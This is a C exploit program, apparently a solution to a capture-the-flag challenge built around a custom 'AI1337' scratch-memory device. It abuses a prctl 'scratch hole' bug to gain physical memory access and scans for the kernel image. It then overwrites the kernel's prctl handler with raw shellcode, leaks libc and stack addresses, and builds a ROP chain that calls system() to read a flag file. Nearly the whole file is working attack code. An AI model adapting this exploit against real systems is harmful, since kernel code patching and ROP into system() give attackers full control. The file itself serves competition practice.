#define _GNU_SOURCE
#include <arpa/inet.h>
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <netinet/in.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/io.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ucontext.h>
#include <sys/un.h>
#include <syscall.h>
#include <time.h>
#include <unistd.h>


#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/wait.h>


typedef struct scratch_info
{
    uint64_t scratch_addr;
    uint64_t scratch_default_size;
    uint32_t scratch_max_slice_size;
    uint16_t scratch_max_slice_count;
} scratch_info;

void get_scratch_info(scratch_info* info);
void load_scratch(uint64_t slice, uint64_t slice_offset, void* source, uint64_t length);
void read_scratch(uint64_t slice, uint64_t slice_offset, void* destination, uint64_t length);
void clear_scratch();
void add_slices(uint64_t slice_a, uint64_t slice_b, uint64_t slice_c);
void sub_slices(uint64_t slice_a, uint64_t slice_b, uint64_t slice_c);
void mul_slices(uint64_t slice_a, uint64_t slice_b, uint64_t slice_c);
uint64_t get_scratch_hole();

#define AI1337_SCRATCH_VA_BASE   0xFFFFFFFFFFA00000ULL
#define AI1337_SCRATCH_PHYS_BASE 0xFFFFFFFFFFF00000ULL
#define AI1337_SCRATCH_SIZE (33ULL * 1024)
#define AI1337_SCRATCH_MAX_NUM_SLICES (128)
#define AI1337_SCRATCH_SLICE_SIZE_DEFAULT (1024ULL)
#define AI1337_SCRATCH_NUM_SLICES_DEFAULT (33UL)
#define AI1337_SCRATCH_MAX_SLICE_SIZE (4096ULL)

#define TARGET_PAGE_BITS 12

# define TARGET_PAGE_MASK    ((int64_t)-1 << TARGET_PAGE_BITS)

void hexdump(void* size, size_t length)
{
    uint8_t* data = size;
    for (size_t i = 0; i < length; i++)
    {
        printf("%02x ", data[i]);
        if (i % 16 == 15)
        {
            printf("\n");
        }
    }
    printf("\n");
}

#define PR_SET_SCRATCH_HOLE		0x53534352

#define MSR_HACK4_SLICE_SIZE            0xc0000105
#define MSR_HACK4_NUM_SLICES            0xc0000106

void* bug(uint64_t phys_addr)
{
    uint64_t need = phys_addr;
    uint64_t va_base = 0xffffffffffdff000;

    uint64_t diff = need - 0x100000;
    va_base -= diff;
    uint64_t phys_base = AI1337_SCRATCH_PHYS_BASE;
    uint64_t addr = 0xffffffffffffffff;

    uint64_t paddr = phys_base + (addr - va_base);
    uint64_t ppage = paddr & TARGET_PAGE_MASK;
    printf(" %lx -> %lx\n", va_base, ppage);
    int res = prctl(PR_SET_SCRATCH_HOLE, va_base, 0, 0, 0);
    printf("prctl res: %d\n", res);


    uint8_t* ptr = (uint64_t*)addr;
    uint64_t vv = *ptr;
    printf("vv: %lx\n", vv);

    ptr = addr & TARGET_PAGE_MASK;

    uint32_t* ptr2 = addr & TARGET_PAGE_MASK;
    return ptr;
}

static void segv_handler(int sig, siginfo_t* info, void* puc)
{
    ucontext_t* uc = puc;
    unsigned char* pc;

    if (sig != SIGSEGV)
    {
        abort();
    }

    (void)info;

    pc = (unsigned char*)uc->uc_mcontext.gregs[REG_RIP];
    if (pc[0] == 0x0f && pc[1] == 0x0a && (pc[2] == 0x83 || pc[2] == 0x84))
    {
        uc->uc_mcontext.gregs[REG_RIP] = (long long)(pc + 3);
        write(1, "patched\n", 8);
        return;
    }
    abort();
}


int main(int argc, char** argv)
{
    size_t slice_size_value = 1024;

    uint64_t* a = malloc(slice_size_value);
    read_scratch(0, 0, a, slice_size_value);
    *a = 0xcafebabe;
    load_scratch(0, 0, a, slice_size_value);


    int pid = fork();
    if (pid == 0)
    {
        void* a = malloc(slice_size_value);
        printf("child\n");
        // trigger sigsegv, keep the access flag enabled to allow arbitrary instructions to trigger patched tlb logic
        load_scratch(36, 0, a, slice_size_value);
        printf("child done\n");
        return 0;
    }
    printf("parent\n");

    int waitres = wait(NULL);
    printf("wait res: %d\n", waitres);


    //#define CONFIG_PHYSICAL_START 0x1000000
    //#define CONFIG_PHYSICAL_ALIGN 0x200000
    int step = 1;
    uint64_t it;
    for (int j = 0; j < 1024; j++)
    {
        it = 0x1000000;
        it += 0x200000 * j;

        pid = fork();
        if (pid == 0)
        {
            void* mem = bug(it);
            uint32_t* dwords = mem;
            //        ffffffff81000000 <.text>:
            //ffffffff81000000:       89 f8                   mov    %edi,%eax
            //ffffffff81000002:       89 f6                   mov    %esi,%esi
            // 89 f8 89 f6
            if (*dwords == 0xf689f889)
            {
                hexdump(mem, 0x1000);
                exit(0);
            }

            exit(1);
        }
        else
        {
            int status;
            waitpid(pid, &status, 0);
            int exit_status = WEXITSTATUS(status);
            printf("Child exited with status: %d\n", exit_status);
            if (exit_status == 0)
            {
                printf("found elf at %p\n", it);
                break;
            }
        }
    }


    uint64_t sym_prctl_set_scratch_hole = 0xFFFFFFFF81709E40;
    uint64_t base = 0xffffffff81000000;

    uint64_t diff = sym_prctl_set_scratch_hole - base;


    void* mem = bug(it + (diff & TARGET_PAGE_MASK));
    uint64_t page_offset = diff & ~TARGET_PAGE_MASK;
    hexdump(mem + page_offset, 0x30);

    uint8_t shellcode[] = {
0x48, 0xbf, 0x00, 0x00, 0xfe, 0xca, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x0a, 0x89, 0xb9, 0x06, 0x01, 0x00, 0xc0, 0x31, 0xd2, 0xb8, 0x80, 0x00, 0x00, 0x00, 0x0f, 0x30, 0x31, 0xc0, 0xc3
    };
    uint8_t shellcode2[] = {
        0x48, 0x89, 0xf8, 0xf7, 0xc7, 0xff, 0x0f, 0x00, 0x00, 0x75, 0x12, 0x48, 0x3b, 0x3d, 0xce, 0x3b, 0x9e, 0x00,
        0x72, 0x09, 0x48, 0x89, 0xc7, 0x0f, 0x0a, 0x89, 0x31, 0xc0, 0xc3, 0xb8, 0xea, 0xff
    };
    assert(sizeof(shellcode) < 32);
    for (int i = 0; i < sizeof(shellcode); i++)
    {
        *(uint8_t*)(mem + page_offset + i) = shellcode[i];
    }

    int res = prctl(PR_SET_SCRATCH_HOLE, 0, 0, 0, 0); // trigger shellcode
    printf("prcntl returned ret = %x\nrecovering...\n", res);

    // recover
    // for (int i = 0; i < sizeof(shellcode2); i++)
    // {
    //     *(uint8_t*)(mem + page_offset + i) = shellcode2[i];
    // }

    printf("recovered\n");

    // hexdump(mem + page_offset, 0x30);
    uint64_t o_rop_start = 14 * 2 * 8;
    read_scratch(67, 14 * 2 * 8, a, 0x10);
    uint64_t libc_leak = a[1];
    uint64_t stack_leak = a[0];
    // uint64_t rop_start_addr = stack_leak -0x120;

    uint64_t libc_base = libc_leak - 0x2a1ca;
    uint64_t system = libc_base + 0x58740;
    uint64_t binsh = libc_base + 0x1cb42f;
    uint64_t pop_rdi_ret = libc_base + 0x000000000010f75b; // : pop rdi; ret;
    uint64_t pop_rsi_ret = libc_base + 0x0000000000110a4d;//: pop rsi; ret;
    uint64_t pop_rbp_ret = libc_base + 0x0000000000028a91; //: pop rbp; ret;;
    uint64_t rdx_gadget = libc_base + 0x00000000000f9ebf;// : mov edx, 0x100; mov eax, 0x20; cmove rax, rdx; ret;

    printf("libc leak %p\n", (void*)libc_leak);
    printf("libc base %p\n", (void*)libc_base);
    printf("system %p\n", (void*)system);
    printf("stack_leak %p\n", (void*)stack_leak);

    printf("65=====\n");
    // hexdump(a, 1024);


    int irp;

    o_rop_start = 13 * 0x10 + 8;
    irp = 0;
    a[irp++] = libc_base + 0x000000000012dfeb; //: add rsp, 0x40; ret;
    load_scratch(67, o_rop_start, a, irp *8);

    char cmd[128] = "cat /home/ctf/flag.txt";
    o_rop_start = 13 * 0x10 + 8 + 0x40;
    irp = 0;
    a[irp++] = 0xdead00001;
    a[irp++] = pop_rdi_ret;
    a[irp++] = stack_leak-0xc8;
    a[irp++] = system;
    // a[irp++] = 0xcafe0000;
    a[irp++] = 0xdead0002;
    a[irp++] = ((uint64_t*)&cmd)[0];
    a[irp++] = ((uint64_t*)&cmd)[1];
    a[irp++] = ((uint64_t*)&cmd)[2];
    a[irp++] = ((uint64_t*)&cmd)[3];
    load_scratch(67, o_rop_start, a, irp *8);


    // printf("==================== 65\n");
    // read_scratch(65, 0, a, 0x1000);
    // hexdump(a, 0x1000);
    //
    //
    // printf("==================== 66\n");
    // read_scratch(66, 0, a, 0x1000);
    // hexdump(a, 0x1000);
    //
    //
    // printf("==================== 67\n");
    // read_scratch(67, 0, a, 0x1000);
    // hexdump(a, 0x1000);




;



    printf("GGWP");
    return 0;
}
